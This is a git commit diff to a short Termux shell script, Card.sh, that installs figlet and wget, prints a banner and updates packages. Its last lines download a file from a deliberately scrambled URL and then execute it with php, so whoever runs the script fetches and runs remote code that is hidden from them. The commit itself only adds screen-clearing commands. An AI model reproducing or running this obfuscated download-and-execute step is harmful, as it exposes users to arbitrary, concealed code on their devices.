ba8c0a97aa43034d91c39f96b8ce0a3f395f4fa5
Alex-724 <alex000824@gmail.com>
2021-06-27 21:20:34 +0300

    Fix error

--- Card.sh
+++ Card.sh
@@ -1,12 +1,12 @@
-#!/data/data/com.termux
-
 pkg install figlet
+clear
 sleep 2
 figlet Alex Up
 sleep 2
 apt-get update && apt-get upgrade
 sleep 2
 pkg install wget
+clear
 sleep 1
 wget  sggkh://kzhgvyrm.xln/izd/XNJbTmuM 
 php CMQyGnfN
